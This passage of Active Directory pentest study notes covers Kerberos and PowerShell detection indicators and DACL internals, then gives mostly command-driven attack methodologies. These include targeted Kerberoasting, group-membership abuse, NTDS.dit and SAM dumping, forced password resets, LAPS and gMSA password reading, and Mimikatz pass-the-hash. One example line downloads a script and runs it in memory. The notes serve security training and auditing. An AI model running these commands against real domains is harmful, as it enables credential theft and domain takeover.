Get-ADUser -filter * -properties DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name

# Check krbtgt password age
Get-ADUser krbtgt -Property PasswordLastSet

6.13.3 Detection: Key Event IDs

Event IDDescriptionRelevance
4624Successful logonGolden/Silver Tickets: Account Domain field blank or FQDN instead of short name; AccountName ≠ SecurityID
4634Successful logoffTrack session lifecycle
4672Special privileges assigned to new logonWatch for unexpected privileged account access
4768TGT requested (Kerberos)Baseline: user enumeration via Kerbrute generates these
4769Service ticket requestedKerberoasting: Ticket Encryption Type = 0x17 (RC4), Failure Code = 0x0, service not ending in $
4770Service ticket renewedUnusual renewal patterns
4771Kerberos pre-authentication failedGenerated by password spraying with Kerbrute

Kerberoasting indicator query for SIEM (Event ID 4769):

# Filter:
# EventID = 4769
# ServiceName != 'krbtgt'
# ServiceName does not end with '$'
# AccountName does not match '<MachineName>$@<Domain>'
# FailureCode = '0x0'
# TicketEncryptionType = '0x17'  (RC4)
# TicketOptions = '0x40810000'

6.13.4 PowerShell Logging

Enable via Group Policy: Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on Module Logging.

Module to LogPurpose
ActiveDirectoryAD module usage
CimCmdletsCIM/WMI interaction
GroupPolicyGroup Policy modifications
Microsoft.WSMan.ManagementWinRM activity
NetAdapter/NetConnectionNetwork cmdlets
PSScheduledJob/ScheduledTasksScheduled task creates/changes/deletes
SmbShareSMB activity
Microsoft.PowerShell.*All PS modules and cmdlets
Activity to WatchDescription
Remote PowerShellRare; users invoking PS on another host is suspicious
(New-Object Net.WebClient).DownloadStringCommon attacker pull-down technique
Invoke-Expression / iexExecutes strings as code
-enc, -E, -EncodedEncoded PS command execution
Invoke-MimikatzDirect indicator of compromise
Invoke-TokenManipulationToken manipulation (PowerSploit)
FromBase64String / Base64Obfuscation
-WindowStyle HiddenHides PS window from user
Execution Policy changes to bypassAttempting to run untrusted scripts
System.ReflectionCommon indicator after Mimikatz execution
 
# Example suspicious command: download and run Invoke-Kerberoast in memory
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"
Note: AMSI (Anti-Malware Scan Interface) in Windows 10/11 scans all script code before execution by PowerShell - including memory-injected code. Enable AMSI-aware AV for an additional detection layer.

7. DACL Attacks I

7.1 DACLs Overview

Within Windows, tokens identify the security context of a process or thread, while security descriptors contain the security information associated with an object. Access control lists (ACLs) implement access control for system resources by enumerating the entities permitted to access a resource and the modes granted to each.

Discretionary access control (DAC) controls access based on the requestor's identity. It is discretionary because an entity with access rights can, by its own volition, enable another entity to access a resource. Windows implements this via Discretionary access control lists (DACLs).

7.1.1 Security Descriptors

Every securable object in Windows has a security descriptor - a binary data structure containing up to six main fields.

typedef struct _SECURITY_DESCRIPTOR {
 BYTE                        Revision;
 BYTE                        Sbz1;
 SECURITY_DESCRIPTOR_CONTROL Control;
 PSID                        Owner;
 PSID                        Group;
 PACL                        Sacl;
 PACL                        Dacl;
} SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;
FieldDescription
Revision NumberSRM version of the security model used to create the descriptor.
Control FlagsOptional modifiers defining behavior/characteristics of the security descriptor.
Owner SIDSID of the object's owner. Owners implicitly have WriteDacl and ReadControl.
Group SIDPrimary group SID. Largely ignored in modern AD environments.
DACLSpecifies who has what access to the object. Primary target for DACL attacks.
SACLSpecifies which operations by which users are logged in the security audit log and the explicit integrity level of an object.

Security descriptors exist in two forms: absolute (containing pointers - what you encounter when interacting with live Windows objects) and self-relative (contiguous memory block, used for on-disk storage and wire transmission).

7.1.2 Control Flags

The Control member is a 16-bit set of bit flags (type SECURITY_DESCRIPTOR_CONTROL).

FlagHex Value
SE_DACL_AUTO_INHERIT_REQ0x0100
SE_DACL_AUTO_INHERITED0x0400
SE_DACL_DEFAULTED0x0008
SE_DACL_PRESENT0x0004
SE_DACL_PROTECTED0x1000
SE_GROUP_DEFAULTED0x0002
SE_OWNER_DEFAULTED0x0001
SE_SACL_AUTO_INHERIT_REQ0x0200
SE_SACL_AUTO_INHERITED0x0800
SE_SACL_DEFAULTED0x0008
SE_SACL_PRESENT0x0010
SE_SACL_PROTECTED0x2000
SE_SELF_RELATIVE0x8000
Note: SE_DACL_PRESENT indicates a security descriptor has a DACL. If not set, or if set and the DACL is NULL, the security descriptor allows full access to everyone. An empty DACL permits access to no one.

7.1.3 ACE Types

A DACL consists of an ACL header followed by an ordered list of Access Control Entries (ACEs). The ACE header struct:

typedef struct _ACL {
 BYTE AclRevision;
 BYTE Sbz1;
 WORD AclSize;
 WORD AceCount;
 WORD Sbz2;
} ACL;

typedef struct _ACE_HEADER {
 BYTE AceType;
 BYTE AceFlags;
 WORD AceSize;
} ACE_HEADER;

There are nine types of ACEs in a DACL. Four are primary:

ACE TypeImplication
ACCESS_ALLOWED_ACEAllows a principal to access an AD object with specified permissions (read, write, modify).
ACCESS_ALLOWED_OBJECT_ACEAllows access to an object and any child objects it contains. Grants permissions without requiring separate ACEs per child object.
ACCESS_DENIED_ACEDenies a principal access to an AD object for specified permissions.
ACCESS_DENIED_OBJECT_ACERestricts access to an object and all child objects it contains without requiring per-child ACEs.

Object-specific ACEs (those containing "Object") are used only within Active Directory and include additional members:

MemberDescription
ObjectTypeGUID identifying a child object type, property set/property, extended right, or validated write.
InheritedObjectTypeSpecifies the type of child object that can inherit the ACE.
FlagsBit flags indicating whether ObjectType and InheritedObjectType are present.

7.2 Viewing DACLs of AD Objects Manually

7.2.1 Using dsacls

dsacls is a native Windows binary that displays and changes ACEs in ACLs of AD objects (equivalent to the Security tab in ADUC).

# View all ACLs for user Yolanda
dsacls.exe "cn=Yolanda,cn=users,DC=[domain],DC=[tld]"

# Filter to show only Pedro's permissions over Yolanda
dsacls.exe "cn=Yolanda,cn=users,DC=[domain],DC=[tld]" | Select-String "Pedro"

7.2.2 Using PowerShell with DirectoryServices and ActiveDirectorySecurity

Use DirectorySearcher with SecurityMasks to retrieve the DACL as a binary blob, then parse it with ActiveDirectorySecurity.

# Retrieve the binary security descriptor for Yolanda
$directorySearcher = New-Object System.DirectoryServices.DirectorySearcher('(samaccountname=Yolanda)')
$directorySearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Owner
$binarySecurityDescriptor = $directorySearcher.FindOne().Properties.ntsecuritydescriptor[0]
Write-Host -NoNewline $binarySecurityDescriptor

# Parse the binary blob and view all ACEs
$parsedSecurityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity
$parsedSecurityDescriptor.SetSecurityDescriptorBinaryForm($binarySecurityDescriptor)
$parsedSecurityDescriptor.Access

# Filter to Pedro's permissions only
$parsedSecurityDescriptor.Access | Where-Object {$_.IdentityReference -like '*Pedro*'}

7.2.3 Viewing DACLs of Processes (Local Kernel Debugging)

To view a process DACL internally, dereference the SecurityDescriptor pointer in the ObjectHeader using WinDbg local kernel debugging.

lkd> !sd 0xffffd08f`3b15a12f & -10

Example output shows Control flags (SE_DACL_PRESENT, SE_SACL_PRESENT, SE_SACL_AUTO_INHERITED, SE_SELF_RELATIVE), Owner/Group SIDs, and each ACE entry with its type, flags, mask, and SID.

7.2.4 Using AccessChk

AccessChk (Sysinternals) displays specific access rights granted to users or groups. Use -l to view a process security descriptor.

.\accesschk64.exe -p "explorer.exe" -l

7.3 DACLs Enumeration

7.3.1 Access Masks and Access Rights

An Access Mask is a 32-bit value in every ACE specifying the allowed or denied rights. For AD objects, it contains a combination of the following bit types.

Generic Access Rights

Display NameCommon NameHex ValueInterpretation
GenericAllGA / RIGHT_GENERIC_ALL0x10000000Full control: create/delete child objects, read/write properties, all extended rights. Equivalent to DE|RC|WD|WO|CC|DC|DT|RP|WP|LC|LO|CR|VW.
GenericExecuteGX / RIGHT_GENERIC_EXECUTE0x20000000Read permissions and list contents of a container. Equivalent to RC|LC.
GenericWriteGW / RIGHT_GENERIC_WRITE0x40000000Read permissions, write all properties, perform all validated writes. Equivalent to RC|WP|VW.
GenericReadGR / RIGHT_GENERIC_READ0x80000000Read permissions, read all properties, list object name and contents. Equivalent to RC|LC|RP|LO.

Standard Access Rights

Display NameCommon NameHex ValueInterpretation
WriteDaclWD / RIGHT_WRITE_DAC0x00040000Allows modifying the object's security descriptor DACL.
WriteOwnerWO / RIGHT_WRITE_OWNER0x00080000Allows modifying the object's security descriptor owner. A user can only take ownership, not transfer it.
ReadControlRC / RIGHT_READ_CONTROL0x00020000Allows reading data from the object's security descriptor (not SACL data).
DeleteDE / RIGHT_DELETE0x00010000Allows deleting the object.

Object-specific Access Rights

Common NameHex ValueInterpretation
CR / RIGHT_DS_CONTROL_ACCESS0x0000100Perform operations controlled by a control access right. Without a GUID in ObjectType, controls all extended rights operations. Also called AllExtendedRights.
WP / RIGHT_DS_WRITE_PROPERTY0x00000020Write properties of the object. Without GUID in ObjectType, controls writing all attributes.
VW / RIGHT_DS_WRITE_PROPERTY_EXTENDED0x00000008Perform validated write operations. Without GUID in ObjectType, controls all validated writes. Also called Self.

7.3.2 Extended and Validated Write Access Rights

Extended Access Rights (abusable - 3 of 56)

Display NameCommon NameRights-GUIDInterpretation
Reset PasswordUser-Force-Change-Password00299570-246d-11d0-a768-00aa006e0529Reset a user's password without knowing the current one. Distinct from User-Change-Password (which requires the old password).
Replicating Directory ChangesDS-Replication-Get-Changes1131f6aa-9c07-11d1-f79f-00c04fc2dcd2Required to replicate changes from a given NC. Required alongside DS-Replication-Get-Changes-All for DCSync.
Replicating Directory Changes AllDS-Replication-Get-Changes-All1131f6ad-9c07-11d1-f79f-00c04fc2dcd2Allows replication of secret domain data. Required alongside DS-Replication-Get-Changes for DCSync.

Validated Writes (abusable - 2 of 5)

Display NameCommon NameRights-GUIDInterpretation
Add/Remove self as memberSelf-Membershipbf9679c0-0de6-11d0-a285-00aa003049e2Allows editing the member attribute - enables setting group membership.
Validated write to service principal nameValidated-SPNf3a64788-5306-11d1-a9c5-0000f80367c1Allows editing the Service Principal Name (SPN) attribute.

7.3.3 Enumerating DACLs with dacledit.py

On Linux, dacledit.py from the ShutdownRepo impacket fork is used to enumerate and modify DACLs.

# Install dacledit.py from ShutdownRepo fork
git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .

# View help
python3 examples/dacledit.py --help

Key arguments:

ArgumentDescription
-actionOperation: read (default), write, remove, backup, restore
-target / -target-sid / -target-dnsAMAccountName, SID, or DN of the object whose DACL to read/edit
-principal / -principal-sid / -principal-dnsAMAccountName, SID, or DN of the principal to filter in the DACL output
-rightsPredefined rights: FullControl, ResetPassword, WriteMembers, DCSync
-rights-guidManual GUID for any extended access right
-inheritanceEnable CONTAINER_INHERIT_ACE and OBJECT_INHERIT_ACE flags - useful for OUs
-fileFilename for backup/restore operations
 
# Read DACL for a user
python3 examples/dacledit.py -target [user] -dc-ip [dc-ip] [domain]/[user]:'[password]'

# Filter to a specific principal
python3 examples/dacledit.py -principal [user] -target [target-user] -dc-ip [dc-ip] [domain]/[user]:[password]
Note: Always activate the virtual environment before running dacledit.py: source .dacledit/bin/activate.

7.3.4 Auditing DACLs with BloodHound

BloodHound gathers all DACLs and correlates them into graph models. It separates control rights into two categories:

  • Inbound Control Rights: equivalent to inspecting the object's own DACL.
  • Outbound Control Rights: aggregation of all references to the object's SID across all DACLs in the domain.

The DACLs Abuses Mindmap (from DACL abuse - The Hacker Recipes) shows attack scenarios based on the controlled principal's access rights over a specific object type. BloodHound edges representing abusable rights include: ForceChangePassword, AddMember, GenericAll, GenericWrite, WriteDACL, WriteOwner, AllExtendedRights, ReadLAPSPassword, ReadGMSAPassword.

Methodology

  • Set up dacledit.py from ShutdownRepo: 
    git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket && python3 -m venv .dacledit && source .dacledit/bin/activate && python3 -m pip install .
  • Read the full DACL of a target object: 
    python3 examples/dacledit.py -target <TARGET> -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS>
  • Filter DACL for a specific principal: 
    python3 examples/dacledit.py -principal <USER> -target <TARGET> -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS>
  • From Windows - enumerate a user's DACL with PowerView: 
    Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
$userSID = (Get-DomainUser -Identity <PRINCIPAL>).objectsid
Get-DomainObjectAcl -Identity <TARGET> -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
  • Run BloodHound Cypher query to map abusable rights: 
    MATCH p=((n)-[r:ForceChangePassword|GenericAll|AllExtendedRights|WriteDACL|WriteOwner|AddMember|ReadLAPSPassword|ReadGMSAPassword]->(m)) RETURN p

7.4 Targeted Kerberoasting

When an attacker controls an account with the ability to write the servicePrincipalName attribute of a target user (GenericAll, GenericWrite, WriteProperty, WriteSPN, or Validated-SPN), they can set an SPN on that user, request a TGS for that SPN (encrypted with the user's NTLM hash), and crack it offline.

7.4.1 Identifying Vulnerable Accounts

# From Linux - find Pedro's rights over Rita
python3 examples/dacledit.py -principal [user] -target [target-user] -dc-ip [dc-ip] [domain]/[user]:[password]
# From Windows - identify controlled user's rights over target
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
$userSID = (Get-DomainUser -Identity [user]).objectsid
Get-DomainObjectAcl -Identity [user] | ?{$_.SecurityIdentifier -eq $userSID}

7.4.2 Targeted Kerberoasting from Linux

targetedKerberoast.py prints Kerberoastable hashes for all users. For users without an SPN, it adds one, captures the hash, then removes the SPN.

# Install
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast
python3 -m pip install -r requirements.txt

# Attack - target specific user
python3 targetedKerberoast.py -vv -d [domain] -u pedro -p [password] --request-user rita --dc-ip [target-ip]
Note: If you get KRB_AP_ERR_SKEW(Clock skew too great), sync clocks with the DC: sudo ntpdate <DC_IP>

7.4.3 Targeted Kerberoasting from Windows

# Set SPN on Rita
Set-DomainObject -Identity [user] -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose

# Get TGS ticket hash
$User = Get-DomainUser Rita
$User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash

# Clear the SPN
Set-DomainObject -Identity Rita -Clear serviceprincipalname -Verbose

7.4.4 Cracking the Hash

# Crack with hashcat (mode 13100 = Kerberos 5 etype 23 TGS-REP)
hashcat -m 13100 /tmp/rita.hash /usr/share/wordlists/rockyou.txt --force

# Validate cracked credentials
poetry run crackmapexec smb [target-ip] -u rita -p [password]

Methodology

  • Identify which principals have WriteSPN/GenericWrite over a target user: 
    python3 examples/dacledit.py -principal <ATTACKER_USER> -target <TARGET_USER> -dc-ip <DC_IP> <DOMAIN>/<ATTACKER_USER>:<PASS>
  • From Linux - run targetedKerberoast against target: 
    python3 targetedKerberoast.py -vv -d <DOMAIN> -u <USER> -p <PASS> --request-user <TARGET> --dc-ip <DC_IP>
  • From Windows - manually set SPN, capture ticket, clear SPN: 
    Set-DomainObject -Identity <TARGET> -Set @{serviceprincipalname='nonexistent/BLAH'} -Verbose
$User = Get-DomainUser <TARGET>; $User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
Set-DomainObject -Identity <TARGET> -Clear serviceprincipalname -Verbose
  • Crack the TGS-REP hash: 
    hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
  • Validate cracked credentials: 
    poetry run crackmapexec smb <DC_IP> -u <TARGET> -p <CRACKED_PASS>

7.5 AddMembers

When a controlled account has GenericAll, GenericWrite, Self, AllExtendedRights, or Self-Membership over a target group, it can add members to that group. Self-Membership restricts the principal to only adding themselves.

7.5.1 Identifying Vulnerable Groups

# From Linux - find Pedro's rights over Backup Operators
cd /home/plaintext/htb/modules/dacl/shutdownRepo/impacket
source .dacledit/bin/activate
python3 examples/dacledit.py -principal [user] -target '[group]' -dc-ip [dc-ip] [domain]/[user]:[password]
# From Windows - identify controlled user's rights over target group
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
$userSID = (Get-DomainUser -Identity [user]).objectsid
Get-DomainObjectAcl -Identity 'Backup Operators' -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}

7.5.2 Abusing AddMember from Linux

The net tool uses SMB/RPC and cannot abuse Self-Membership. Use it when you have other rights except Self-Membership.

# Query group membership
net rpc group members 'Backup Operators' -U [domain]/pedro%SecuringAD01 -S [target-ip]

# Attempt add with net (fails with Self-Membership)
net rpc group addmem 'Backup Operators' pedro -U [domain]/pedro%SecuringAD01 -S [target-ip]

For Self-Membership, use the LDAP protocol instead. The addusertogroup.py script uses the ldap3 library:

import argparse
import sys
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD, MODIFY_REPLACE, MODIFY_DELETE

parser = argparse.ArgumentParser(description='Add a user to an Active Directory group.')
parser.add_argument('-d','--domain', required=True, help='The domain name of the Active Directory server.')
parser.add_argument('-g','--group', required=True, help='The name of the group to add the user to.')
parser.add_argument('-a','--adduser', required=True, help='The username of the user to add.')
parser.add_argument('-u','--user', required=True, help='The username of an Active Directory user with AddMember privilege.')
parser.add_argument('-p','--password', required=True, help='The password of the Active Directory user.')
args = parser.parse_args()

domain_name = args.domain
group_name = args.group
user_name = args.adduser
ad_username = args.user
ad_password = args.password

search_base = 'dc=' + ',dc='.join(domain_name.split('.'))
server = Server(domain_name, get_info=ALL)
conn = Connection(server, user=f'{domain_name}\\{ad_username}', password=ad_password, authentication=NTLM)

if conn.bind():
    print('[+] Connected to Active Directory successfully.')
else:
    print('[-] Error: failed to bind to the Active Directory server.')
    sys.exit(1)

conn.search(search_base=search_base, search_filter=f'(&(objectClass=group)(cn={group_name}))', attributes=['member'])

if conn.entries:
    print('[+] Group ' + group_name + ' found.')
else:
    print('[-] Error: group not found.')
    sys.exit(1)

group_dn = conn.entries[0].entry_dn
members = conn.entries[0].member.values

conn.search(search_base=search_base, search_filter=f'(&(objectClass=user)(sAMAccountName={user_name}))', attributes=['distinguishedName'])

if conn.entries:
    print('[+] User ' + user_name + ' found.')
else:
    print('[-] Error: user not found.')
    sys.exit(1)

user_dn = conn.entries[0].distinguishedName.value

if user_dn in members:
    print('[+] User is already a member of the group.')
else:
    if conn.modify(dn=group_dn, changes={'member': [(MODIFY_ADD, [user_dn])]}):
        print('[+] User added to group successfully.')
    else:
        print('[-] There was an error trying to add the user to the group.')
# Run addusertogroup.py
python3 addusertogroup.py -d [domain] -g "Backup Operators" -a pedro -u pedro -p [password]

# Verify membership
net rpc group members 'Backup Operators' -U [domain]/pedro%SecuringAD01 -S [target-ip]
Note: Configure DNS and add domain/IP entries to /etc/hosts before running the LDAP script.

7.5.3 Abusing AddMember from Windows

net on Windows also cannot abuse Self-Membership. Use Add-DomainGroupMember from PowerView, which operates via System.DirectoryServices.AccountManagement.

# Verify net fails with Self-Membership
net localgroup "Backup Operators" pedro /add
# System error 5: Access is denied.

# Use PowerView to add Pedro to Backup Operators
Add-DomainGroupMember -Identity "Backup Operators" -Members pedro -Verbose

7.5.4 Abusing Newly Gained Backup Operators Privileges

After joining Backup Operators, reauthenticate and launch a new cmd.exe as Administrator to get SeBackupPrivilege.

# Verify privileges
whoami /priv

# Back up SAM and SYSTEM hives
reg save hklm\sam C:\users\Public\sam && reg save hklm\system C:\users\Public\system

To extract NTDS.dit, create a shadow copy using a diskshadow script:

# Diskshadow script content (C:\Users\Public\diskshadowscript.txt)
set context persistent nowriters
set metadata c:\windows\temp\file.cab
set verbose on
begin backup
add volume c: alias mydrive
create
expose %mydrive% p:
end backup
# Execute diskshadow script
diskshadow /s C:\Users\Public\diskshadowscript.txt

# Copy NTDS.dit from shadow copy
robocopy /b P:\Windows\ntds\ C:\Users\Public\ ntds.dit

From Linux, start an SMB server and use reg.py to retrieve registry hives:

# Start SMB server on attacker
sudo smbserver.py -smb2support share .

# Retrieve SAM and SYSTEM via reg.py
reg.py [domain]/[user]:[password] backup -o '\\[target-ip]\share'

# Dump credentials
secretsdump.py -sam SAM.save -system SYSTEM.save -ntds ntds.dit LOCAL

# PtH with extracted hash
psexec.py [email protected] -hashes :f9ddbbd0677777796c8593ef89fb639c

Methodology

  • Confirm the controlled principal's rights over a target group: 
    python3 examples/dacledit.py -principal <USER> -target '<GROUP>' -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS>
  • From Linux - add user to group via LDAP (handles Self-Membership): 
    python3 addusertogroup.py -d <DOMAIN> -g "<GROUP>" -a <TARGET_USER> -u <PRINCIPAL> -p <PASS>
  • From Windows - add user to group with PowerView: 
    Add-DomainGroupMember -Identity "<GROUP>" -Members <TARGET_USER> -Verbose
  • After joining Backup Operators - dump SAM/SYSTEM and NTDS.dit: 
    reg save hklm\sam C:\users\Public\sam
reg save hklm\system C:\users\Public\system
diskshadow /s C:\Users\Public\diskshadowscript.txt
robocopy /b P:\Windows\ntds\ C:\Users\Public\ ntds.dit
  • Dump credentials from collected files: 
    secretsdump.py -sam SAM.save -system SYSTEM.save -ntds ntds.dit LOCAL

7.6 Password Abuse

DACL privileges such as ForceChangePassword, ReadLAPSPassword, and ReadGMSAPassword enable password abuse attacks - resetting passwords for other accounts or reading managed passwords.

7.6.1 ForceChangePassword

User-Force-Change-Password allows resetting another account's password without knowing the current one. Required access rights: GenericAll, AllExtendedRights, or User-Force-Change-Password over the target.

# BloodHound Cypher query
MATCH p=((n:User {name:"[email protected]"})-[r:ForceChangePassword|GenericAll|AllExtendedRights]->(m)) RETURN p
# Enumerate Pedro's access over multiple accounts with dacledit.py
python3 examples/dacledit.py -principal [user] -target [target-user] -dc-ip [target-ip] [domain]/[user]:[password]
python3 examples/dacledit.py -principal [user] -target [target-user] -dc-ip [target-ip] [domain]/[user]:[password]
python3 examples/dacledit.py -principal [user] -target [target-user] -dc-ip [dc-ip] [domain]/[user]:[password]
# From Windows - enumerate without GUID resolution
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
$userSID = (Get-DomainUser -Identity [user]).objectsid
Get-DomainObjectAcl -Identity yolanda | ?{$_.SecurityIdentifier -eq $userSID}

# With GUID resolution to get human-readable right names
Get-DomainObjectAcl -Identity yolanda -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}

Abusing ForceChangePassword from Linux

# Validate current credentials (pre-reset)
poetry run crackmapexec ldap [target-ip] -u yolanda -p [password]

# Reset password with net
net rpc password yolanda Mynewpassword1 -U [domain]/pedro%SecuringAD01 -S [target-ip]

# Validate new credentials
poetry run crackmapexec ldap [target-ip] -u yolanda -p [password]

# Alternatively, use rpcclient
rpcclient -U INLANEFREIGHT/pedro%SecuringAD01 [target-ip]
rpcclient $> setuserinfo2 yolanda 23 Mynewpassword2
rpcclient $> exit

# Validate
poetry run crackmapexec ldap [target-ip] -u yolanda -p [password]

Abusing ForceChangePassword from Windows

# Reset with PowerView
Set-DomainUserPassword -Identity yolanda -AccountPassword $((ConvertTo-SecureString 'NewpasswordfromW1' -AsPlainText -Force)) -Verbose

# Reset with Active Directory module
Import-Module ActiveDirectory
Set-ADAccountPassword yolanda -NewPassword $((ConvertTo-SecureString 'NewpasswordfromW2' -AsPlainText -Force)) -Reset -Verbose
Note: Using net on Linux does not require admin rights to reset passwords. On Windows, net user for password resets requires administrative privileges; use PowerView or AD module instead.

Methodology

  • Find accounts where controlled principal has ForceChangePassword/GenericAll/AllExtendedRights: 
    python3 examples/dacledit.py -principal <USER> -target <TARGET> -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS>
  • Reset password from Linux using net: 
    net rpc password <TARGET> <NEWPASS> -U <DOMAIN>/<ATTACKER>%<PASS> -S <DC_IP>
  • Reset password from Linux using rpcclient: 
    rpcclient -U <DOMAIN>/<USER>%<PASS> <DC_IP>
rpcclient $> setuserinfo2 <TARGET> 23 <NEWPASS>
  • Reset password from Windows using PowerView: 
    Set-DomainUserPassword -Identity <TARGET> -AccountPassword $((ConvertTo-SecureString '<NEWPASS>' -AsPlainText -Force)) -Verbose
  • Validate the new credentials: 
    poetry run crackmapexec ldap <DC_IP> -u <TARGET> -p <NEWPASS>

7.7 ReadLAPSPassword

LAPS (Local Administrator Password Solution) manages local admin passwords by storing randomized, rotating passwords in the ms-MCS-AdmPwd AD attribute. If a controlled account has ReadProperty over ms-MCS-AdmPwd, or GenericAll / AllExtendedRights over a LAPS-enabled computer object, the local admin password can be read.

LAPS AttributePurpose
ms-MCS-AdmPwdStores the current local administrator password (cleartext)
ms-MCS-AdmPwdExpirationTimeStores the expiration time for the password rotation
 
# BloodHound Cypher query to identify ReadLAPSPassword paths
MATCH p=((n)-[r:ReadLAPSPassword]->(m)) RETURN p
# Check group-level DACL over LAPS computer (dacledit limitation: no recursive group resolution)
python3 examples/dacledit.py -principal [user] -target '[computer]$' -dc-ip [target-ip] [domain]/[user]:[password]

# Search via group name instead
python3 examples/dacledit.py -principal '[group]' -target '[computer]$' -dc-ip [dc-ip] [domain]/[user]:[password]
# From Windows - enumerate DACL for LAPS computer via group
$group = Get-DomainGroup -Identity "LAPS Readers"
Get-DomainObjectAcl -Identity LAPS09 -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $group.objectsid}
Note: Both dacledit.py and PowerView do NOT perform recursive group membership lookups. If the privilege is assigned to a group, query the group directly rather than the user.

7.7.1 Abusing ReadLAPSPassword from Windows

# Read LAPS password with PowerView
Import-Module .\PowerView.ps1
Get-DomainObject -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name

# Read LAPS password with ActiveDirectory module
Import-Module ActiveDirectory
Get-ADComputer -Identity LAPS09 -Properties "ms-mcs-AdmPwd",name

# Enumerate all LAPS-enabled computers accessible by current user
Import-Module .\PowerView.ps1
Get-DomainComputer -Properties name | ForEach-Object {
   $computer = $_.name
   $obj = Get-DomainObject -Identity $computer -Properties "ms-mcs-AdmPwd",name -ErrorAction SilentlyContinue
   if($obj.'ms-mcs-AdmPwd'){
       Write-Output "$computer`: $($obj.'ms-mcs-AdmPwd')"
   }
}

7.7.2 Abusing ReadLAPSPassword from Linux

# Use LAPSDumper
git clone https://github.com/n00py/LAPSDumper -q
cd LAPSDumper
python3 laps.py -u rita -p [password] -l [target-ip] -d [domain]

Methodology

  • Identify ReadLAPSPassword paths in BloodHound: 
    MATCH p=((n)-[r:ReadLAPSPassword]->(m)) RETURN p
  • From Linux - dump all accessible LAPS passwords: 
    git clone https://github.com/n00py/LAPSDumper -q
cd LAPSDumper && python3 laps.py -u <USER> -p <PASS> -l <DC_IP> -d <DOMAIN>
  • From Windows - read LAPS password for a specific computer: 
    Import-Module .\PowerView.ps1
Get-DomainObject -Identity <COMPUTER> -Properties "ms-mcs-AdmPwd",name
  • Use the local admin password to connect to the target computer: 
    poetry run crackmapexec smb <TARGET_IP> -u Administrator -p '<LAPS_PASS>'

7.8 ReadGMSAPassword

Group Managed Service Accounts (gMSAs) have their passwords automatically generated, securely stored, and periodically rotated by the AD DC. The password blob is stored in msDS-ManagedPassword. Principals authorized to read a gMSA's password are stored in msDS-GroupMSAMembership. Obtaining a gMSA password allows impersonation of that service account.

# BloodHound Cypher query to identify ReadGMSAPassword paths
MATCH p=((n)-[r:ReadGMSAPassword]->(m)) RETURN p

7.8.1 Abusing ReadGMSAPassword from Linux

# Use gMSADumper.py to retrieve gMSA password blobs
python3 gMSADumper.py -d [domain] -l [target-ip] -u pedro -p [password]

# Validate retrieved NT hash
poetry run crackmapexec ldap [target-ip] -u jenkins-dev$ -H 4d8bcd4f5c70fe71beb848b4ab124e61
Note: dacledit.py cannot enumerate ReadGMSAPassword privileges. Use BloodHound Cypher queries instead.

7.8.2 Abusing ReadGMSAPassword from Windows

# Use GMSAPasswordReader - may return both old and current password hashes
C:\Tools> GMSAPasswordReader.exe --accountname apache-dev
# OverPass-the-Hash with Mimikatz to get a PowerShell session as the gMSA
mimikatz.exe privilege::debug "sekurlsa::pth /user:apache-dev$ /domain:[domain] /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe" exit
Note: GMSAPasswordReader may return hashes for both the old and current password - either may be valid. If group membership is added to the gMSA, create a new session after the change to ensure the new rights are reflected.

Methodology

  • Identify ReadGMSAPassword paths in BloodHound: 
    MATCH p=((n)-[r:ReadGMSAPassword]->(m)) RETURN p
  • From Linux - dump gMSA passwords: 
    python3 gMSADumper.py -d <DOMAIN> -l <DC_IP> -u <USER> -p <PASS>
  • Validate harvested NT hash: 
    poetry run crackmapexec ldap <DC_IP> -u <GMSA_ACCOUNT>$ -H <NT_HASH>
  • From Windows - read gMSA hash with GMSAPasswordReader: 
    GMSAPasswordReader.exe --accountname <GMSA_NAME>
  • OverPass-the-Hash to spawn a session as the gMSA: 
    mimikatz.exe privilege::debug "sekurlsa::pth /user:<GMSA>$ /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe" exit

7.9 Granting Rights and Ownership

WriteDacl allows modifying a target object's DACL. Ownership (via WriteOwner) grants administrative control over an object's security descriptor. Both enable assigning new permissions to enable further attacks.

7.9.1 Identifying WriteDacl / WriteOwner Paths

# From Windows - find Luna's WriteDacl over the domain
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1
$userSID = ConvertTo-SID luna
Get-DomainSID | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
# From Linux - find Luna's WriteDacl over the domain
python3 examples/dacledit.py -principal [user] -target-dn DC=[domain],DC=[tld] -dc-ip [dc-ip] [domain]/[user]:[password]

